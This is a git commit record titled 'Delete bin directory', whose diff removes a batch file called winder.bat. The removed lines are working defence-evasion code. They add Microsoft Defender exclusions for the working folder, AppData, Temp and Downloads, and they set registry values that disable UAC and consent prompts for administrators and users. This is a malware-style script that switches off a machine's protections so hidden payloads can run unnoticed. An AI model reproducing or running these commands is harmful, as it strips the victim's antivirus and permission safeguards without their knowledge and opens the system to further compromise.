d88dff0de2f1feb16595a8770291cc40cfcdd7ca
gyodosama <pipiskavoras@gmail.com>
2025-05-26 20:50:48 +0400

    Delete bin directory

--- bin/winder.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-powershell -Command "Add-MpPreference -ExclusionPath '%CD%'"
-powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData'"
-powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
-powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Downloads'"
-
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser /t REG_DWORD /d 0 /f
